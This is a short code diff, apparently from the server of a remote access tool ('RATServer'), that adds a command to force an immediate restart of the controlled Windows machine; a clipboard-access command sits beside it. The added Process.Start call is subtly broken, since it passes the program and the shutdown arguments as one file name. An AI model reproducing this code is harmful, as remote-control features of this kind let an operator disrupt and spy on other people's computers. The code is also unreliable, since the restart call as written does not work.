@@ -86,6 +86,17 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
+        public static Response Restart()
+        {
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process.Start("cmd.exe shutdown -r -f -t 00");
+                r.Msg = "Restart Success";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
+            return r;
+        }
         public static Response ClipBoard()
         {
             Response r = new Response { Type = "Message" };
